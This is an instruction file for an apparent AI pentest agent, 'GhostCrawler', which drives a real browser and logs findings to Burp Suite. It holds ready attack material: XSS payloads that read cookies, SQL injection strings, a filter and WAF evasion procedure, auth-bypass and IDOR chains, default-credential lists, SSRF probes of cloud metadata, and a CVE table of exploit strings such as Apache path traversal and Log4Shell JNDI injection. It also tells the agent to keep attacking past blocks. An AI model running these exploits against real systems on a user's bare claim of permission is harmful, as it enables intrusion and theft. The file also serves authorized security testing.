---
name: ghostcrawler
description: >
  GhostCrawler is a live MCP pentest agent. Controls a real Chrome browser,
  crawls attack surfaces, fires exploits through the browser so every request
  appears in Burp Suite Proxy History, and logs all findings automatically.
  Use for: authorized web pentesting, source code review, auth bypass, IDOR,
  XSS, SQLi, default credential testing, OWASP Top 10, Burp logging.
argument-hint: 'target URL or command (e.g. pentest_active_tab, gc_doctor)'
---

# GhostCrawler Pentest Agent

## Authorization

This skill is for **authorized penetration testing engagements only**.
By invoking it against a target, you assert you have written permission to test that system.

---

## How It Works

GhostCrawler fires exploits through a **real browser** -- not curl.
JavaScript executes, session cookies are real, DOM XSS fires in the actual DOM.
Every request flows through Burp Proxy automatically.

```
Chrome Extension  <-->  MCP Server (:3200)  <-->  VS Code Copilot
                                |
                         Burp Suite MCP (:9876)
                                |
                          Burp Proxy History
```

---

## Tool Reference

| Tool | When to Use |
|------|-------------|
| pentest_active_tab | Full pentest: source review + OWASP + live exploits + Burp logging |
| auto_crawl | Crawl and attack all forms and buttons on the page |
| get_attack_surface | Map forms, buttons, API endpoints before exploiting |
| run_browser_plan | Precise sequence: navigate, type, click -- custom exploit chains |
| run_attack_command | One attack type: xss, manual-sqli, default-creds, custom-request |
| observe_dom_changes | Watch live DOM to confirm XSS fires, redirects, mutations |
| start_live_scan | Click all buttons one by one and test each interaction |
| gc_doctor | Run first on ANY failure -- checks bridge, extension, Burp MCP |
| check_burp_mcp | Verify Burp Suite MCP connection |

---

## Phase 0: Source Code Review

**Run this before sending any payloads.** The cheapest bugs are in plain sight.

**Targeting rule:** Use `get_attack_surface` first to map all inputs and endpoints.
Prioritize high-value fields (id, role, mode, debug flags, data sinks).
Skip minified JS bundles unless `get_attack_surface` flags a specific config object
(e.g. `window.__INITIAL_STATE__`, `window.APP_CONFIG`). Read those specifically.

### HTML to Inspect

```
Hidden fields  ->  <input type="hidden" name="mode" value="0">
  Flag names:      mode, role, admin, debug, bypass, auth, level, access, tier
Form actions   ->  <form action="/login" method="POST">  note endpoint + method
HTML comments  ->  <!-- admin panel: /internal -->
```

### JavaScript to Inspect

```
DOM XSS sinks:
  element.innerHTML = userInput       ->  XSS
  document.write(param)               ->  XSS
  eval(data)                          ->  code injection
  window.location = param             ->  open redirect

Client-side auth gates:
  if (localStorage.getItem('token'))  ->  bypass: set the key in storage
  if (data.success === true) navigate ->  bypass: flip response body in Burp

Hardcoded secrets:
  apiKey = "sk-live-..."              ->  test against the API directly
  password = "admin123"               ->  try on login form
  eyJ...                              ->  JWT; decode at jwt.io; check alg:none
  AKIA...                             ->  AWS key; Critical finding

Hidden API endpoints:
  fetch('/api/internal/users')
  axios.get('/admin/export')
```

### Finding to OWASP Mapping

| Finding | OWASP | Exploit Approach |
|---------|-------|-----------------|
| Hidden field mode=0 | A01 | Submit form with mode=1 |
| innerHTML = userInput | A03 | Inject img src=x onerror=alert(1) |
| localStorage gate | A04 | Set key, navigate directly |
| data.success drives navigation | A07 | Flip field via Burp Match+Replace |
| Hardcoded JWT or API key | A02 | Test key against the API |
| HTML comment with credentials | A05 | Try credentials on login |
| ?id= with no server check | A01 | Enumerate id=1,2,3 (IDOR) |

## Resiliency Rules

- **Don't stop on errors.** HTTP 401/403/500 and WAF blocks are data, not dead ends.
  Log the response, adapt the approach, continue the chain.
- **Verify session before IDOR.** Check cookies/localStorage are still valid before
  enumerating IDs. Silent token drops cause false negatives.
- **Prioritize, don't loop blindly.** Attack the highest-value targets first.
  Don't fuzz every field generically -- pick the ones that matter (id, role, token, debug).

---

## Filter Evasion Loop

When a payload is blocked or sanitized, follow this sequence instead of giving up:

```
Step 1 -- Probe
  Submit control string:  ' " < > / ; ( ) [ ] = + -- #
  Observe: are characters stripped, escaped, or HTML-entity encoded?

Step 2 -- Map constraints
  Quotes escaped?    -> use String.fromCharCode() or template literals (backticks)
  Brackets stripped? -> use inline attribute breakout: src="x" onerror=...
  Spaces blocked?    -> use slashes: <img/src=x/onerror=alert(1)>
  Keywords blocked?  -> use case variation (aLeRt), string concat, alt sinks

Step 3 -- Tailor payload
  Build a custom payload that avoids only the blocked elements.

Step 4 -- WAF (403/406)
  Strip payload down to individual components to find the trigger.
  Apply layered encoding: URL -> double-URL -> hex -> base64.
  Or switch vector entirely (different param, different endpoint, HTTP header).
```

---

## Phase 1: Component & Version Fingerprinting (A06)

**Run after Phase 0 source review.** Identify what the target is built on before attacking it.
A version number often maps directly to a known exploit — no fuzzing needed.

### Step 1 — Read Response Headers

```
run_attack_command: custom-request
  HEAD https://target.com/

Look for:
  Server:           Apache/2.4.49   -> CVE-2021-41773 (path traversal + RCE)
  X-Powered-By:     PHP/7.4.3       -> check EOL; PHP < 8.0 has multiple RCE CVEs
  X-Generator:      WordPress 5.8   -> CVE-2021-44223 and plugin vulns
  X-AspNet-Version: 4.0.30319       -> outdated .NET; check IIS CVEs
  Via: / X-Varnish:                 -> cache poisoning candidates
```

### Step 2 — Read HTML Source for JS Libraries

```
Phase 0 source review -- look for version strings in script tags:

  <script src="/jquery-1.12.4.min.js">      -> jQuery 1.12.4 = CVE-2019-11358 (prototype pollution)
  <script src="/angular.js?v=1.5.0">        -> AngularJS 1.5 = sandbox escape + XSS
  <script src="/bootstrap.min.js?v=3.3.7">  -> Bootstrap 3 XSS CVEs
  <meta name="generator" content="...">     -> CMS version exposed
  window.GLOBALS = { version: "2.1.4" }    -> app version in JS config object
```

### Step 3 — Probe Error Pages for Stack Info

```
run_browser_plan:
  navigate -> /doesnotexist_404_probe
  navigate -> /index.php?id='
  navigate -> /api/nonexistent

Look for:
  Stack traces          -> framework name + exact version
  SQL error messages    -> database type (MySQL, PostgreSQL, MSSQL)
  PHP/Python warnings   -> runtime version
  "powered by X"        -> third-party component names
```

### Step 4 — Check /robots.txt, /sitemap.xml, /.well-known/

```
run_browser_plan:
  navigate -> /robots.txt
  navigate -> /sitemap.xml
  navigate -> /.well-known/security.txt
  navigate -> /CHANGELOG.md
  navigate -> /package.json
  navigate -> /composer.json

Why: version files, hidden paths, and admin panel locations often exposed here.
```

### CVE Cross-Reference Table

Match detected versions here before attacking. GhostCrawler exploits these through the browser.

| Component | Vulnerable Version | CVE | Impact | GhostCrawler Attack |
|-----------|-------------------|-----|--------|---------------------|
| Apache HTTP | 2.4.49 | CVE-2021-41773 | Path traversal + RCE | custom-request GET /cgi-bin/.%2e/.%2e/etc/passwd |
| Apache HTTP | 2.4.49-50 | CVE-2021-42013 | Improved bypass of above | custom-request with double encoding |
| PHP-FPM + nginx | any misconfigured | CVE-2019-11043 | RCE via path_info | navigate /index.php/malicious_path |
| Log4j 2.x | < 2.15.0 | CVE-2021-44228 | JNDI RCE (Log4Shell) | inject ${jndi:ldap://...} in User-Agent / search fields |
| Spring Framework | 5.3.x / 5.2.x | CVE-2022-22965 | Spring4Shell RCE | POST multipart to any Spring endpoint |
| Spring Cloud Gateway | < 3.1.1 | CVE-2022-22947 | SPEL injection via actuator | POST /actuator/gateway/routes |
| Confluence | < 7.18.1 | CVE-2022-26134 | OGNL template injection RCE | GET /%24%7B...%7D/ in URL path |
| MOVEit Transfer | < 2023.0.1 | CVE-2023-34362 | SQLi to RCE | inject into file transfer params |
| GitLab CE/EE | < 14.10.5 | CVE-2021-22205 | Unauthenticated RCE via ExifTool | upload crafted image to any avatar field |
| jQuery | < 3.5.0 | CVE-2020-11022/23 | XSS via HTML parsing | inject into any field rendered by jQuery .html() |
| jQuery | < 3.4.0 | CVE-2019-11358 | Prototype pollution | submit JSON with __proto__ key |
| AngularJS | < 1.8.0 | CVE-2019-10768 | Prototype pollution | inject into Angular expression |
| WordPress | < 5.8.3 | CVE-2022-21661 | SQLi via WP_Query | inject into ?s= search parameter |
| Exchange Server | 2013-2019 | CVE-2021-26855 | SSRF + auth bypass (ProxyLogon) | custom-request to /ecp/Current/ |
| Drupal | < 9.3.12 | CVE-2022-25277 | RCE via file upload | upload PHP file to media module |
| Laravel | debug mode on | CVE-2021-3129 | RCE via Ignition | POST /_ignition/execute-solution |

### A06 Finding Template

```
When a version match is confirmed:

  Component:    Apache 2.4.49
  CVE:          CVE-2021-41773
  Severity:     Critical
  Confirmed:    GET /cgi-bin/.%2e/.%2e/etc/passwd returned file content

  Burp tab:     [CRITICAL] CVE-2021-41773 - GET /cgi-bin/
  OWASP:        A06:2021 Vulnerable and Outdated Components
  Remediation:  Upgrade to Apache 2.4.51+; disable mod_cgi if not needed
```

---

## OWASP Top 10 Playbook

### A01 - Broken Access Control

Hidden field auth bypass:
```
run_browser_plan:
  navigate  ->  /login
  type      ->  input[name='username'] = 'anything'
  type      ->  input[name='password'] = 'anything'
  type      ->  input[name='mode']     = '1'
  click     ->  button[type='submit']
  -> landed on /panel = BYPASSED (Critical)
```

IDOR enumeration:
```
run_browser_plan:
  navigate  ->  /profile?id=1  (own record)
  navigate  ->  /profile?id=2  (another user)
  navigate  ->  /profile?id=3
  -> different user data returned = IDOR (High/Critical)
```

### A03 - Injection

Reflected XSS:
```
run_attack_command: xss
  selector:  input[name='q']
  payload:   <img src=x onerror=alert(document.cookie)>
  observe_dom_changes  ->  confirm alert fires
```

Stored XSS (two-step):
```
run_browser_plan:
  type    ->  #comment-field = '<img src=x onerror="document.body.setAttribute(\'data-xss\',\'gc_found\')">'
  click   ->  Save
  navigate -> /posts/123  (renders the comment)
observe_dom_changes  ->  look for data-xss="gc_found" on body = XSS CONFIRMED

Note: do NOT rely on alert() timeout as the only signal.
Prefer data marker payloads -- they work headlessly and don't block execution.
```

SQL Injection:
```
run_attack_command: manual-sqli
  selector:  input[name='search']
  payload:   ' OR 1=1--
  -> extra rows or SQL error = SQLi CONFIRMED
```

### A04 - Insecure Design
```
run_browser_plan:
  navigate  ->  /dashboard  (without logging in)
  -> page loads without redirect = no server session check (Critical)
```

### A05 - Security Misconfiguration
```
run_attack_command: default-creds
  admin/admin, admin/password, root/root, admin/admin123
  -> successful login = Critical

Also check:
  navigate -> /admin, /.git, /backup, /phpinfo.php, /server-status
```

### A07 - Authentication Failures
```
Session not invalidated on logout:
  1. Login and copy session cookie
  2. Logout
  3. Replay request with old cookie
  -> still authenticated = High

Token in URL:
  look for /reset?token=abc123
  -> token in URL = exposed in browser history/referrer = High
```

### A10 - SSRF
```
run_attack_command: custom-request
  /api/fetch?url=http://127.0.0.1/admin
  /api/fetch?url=http://169.254.169.254/latest/meta-data/
  -> internal response returned = SSRF (Critical)
```

---

## Full Exploit Chain

```
pentest_active_tab
  Step 1:  get_attack_surface           map forms, buttons, API endpoints
  Step 2:  Source review                find bugs before touching anything
  Step 3:  run_browser_plan             auth bypass (hidden field or localStorage)
  Step 4:  run_browser_plan             IDOR enumeration after bypass
  Step 5:  run_browser_plan + type      inject XSS payload
  Step 6:  run_browser_plan + navigate  trigger stored XSS
  Step 7:  observe_dom_changes          confirm XSS fires
  Step 8:  Burp logging                 all findings auto-sent
```

---

## Burp Logging Rules

- Every confirmed finding is sent to Burp Repeater automatically
- Tab naming: [CRITICAL] Auth Bypass - POST /login
- Severity levels: Critical, High, Medium, Low, Info
- If Burp is offline: complete the scan, retry with check_burp_mcp at the end

---

## Severity Scoring Rubric

Severity is assigned in two passes: the scanner emits an **initial severity** based on
code rules, then a **final severity** is gated by evidence confidence.

### Confidence Tiers

| Confidence | Meaning | Max allowed severity |
|------------|---------|----------------------|
| Potential | Risky pattern only — no confirmed tainted input | Medium |
| Probable | Partial exploit signal — indirect path or partial control | High |
| Confirmed | Exploit fully reproduced in the browser | Critical / High |

### Hard Caps by Finding Type

| Finding Type | Default severity | Escalation condition |
|---|---|---|
| Any missing security header | **Low** | Never raised above Low on its own |
| Missing HSTS | **Low** | — |
| Missing X-Frame-Options | **Low** | — |
| Missing CSP | **Low** | — |
| Missing Referrer-Policy | **Low** | — |
| Missing Permissions-Policy | **Low** | — |
| CSP missing frame-ancestors | **Low** | — |
| Clickjacking (embeddable page) | **Low** | **Medium** if sensitive state-changing flow (auth, settings, payments) is frameable |
| Open Redirect Sink in JS (pattern only) | **Low** | **Medium** once user-controlled source confirmed; **High** with phishing chain |
| Unsafe DOM Sink (innerHTML/outerHTML/document.write) | **Medium** | **High** once controlled source confirmed; **Critical** after data exfil demonstrated |
| Client-side access control logic | **Medium** | **High** if bypass reaches privileged endpoint |
| IDOR | **High** | **Critical** if sensitive data (PII, credentials) or admin-level access |
| Auth bypass | **Critical** | — |
| SQLi (confirmed error or row return) | **Critical** | — |
| XSS (confirmed DOM marker or cookie theft) | **High** | **Critical** after session hijack demonstrated |
| Stored XSS | **Critical** | — |
| SSRF to internal network | **Critical** | — |
| Default credentials success | **Critical** | — |
| Hardcoded AWS key (AKIA...) | **Critical** | — |
| Hardcoded JWT | **High** | **Critical** if not expired and grants elevated access |
| Confirmed CVE exploit | **Critical** | — |

### Escalation Rules (summary)

- **Header findings**: always Low or Info. Never Medium+ unless directly chained into a confirmed exploit.
- **DOM sinks**: Medium (potential) → High (confirmed source) → Critical (exfil).
- **Clickjacking**: Low unless sensitive UI actions are frameable, then Medium.
- **Open redirect**: Low (sink only) → Medium (confirmed source) → High (phishing/XSS chain).
- **Business impact override**: even a Low technical finding can be noted as High-impact in the report if the affected workflow is critical (e.g., password reset, payment).

---

## Error Handling

| Symptom | Fix |
|---------|-----|
| Anything fails | Run gc_doctor first; always |
| -32001 timeout | Reload extension at chrome://extensions, retry |
| Extension context invalidated | Navigate to the target tab again |
| Cannot access chrome-extension URL | Switch to a normal webpage tab |
| Burp not logging | check_burp_mcp, verify port 9876 is open |
| Scan stops mid-chain | gc_doctor, re-run from the failed step |

---

## Key Technical Notes

- **Hidden field bypass**: use the type action on the hidden input directly.
  Do not use navigate with javascript: -- it kills the page session.
- **XSS confirmation**: prefer `data-xss="gc_found"` marker payloads + `observe_dom_changes`.
  alert() timeout is a secondary signal only -- it blocks execution and fails headlessly.
- **Stored XSS = two steps**: inject via POST, then navigate to trigger via GET.
- **IDOR after auth**: always establish a valid session before testing IDOR.
- **Bridge port 3200**: hardcoded in the extension. Do not change.
- **Burp proxy port 8080**: configure Chrome to proxy through Burp before testing.
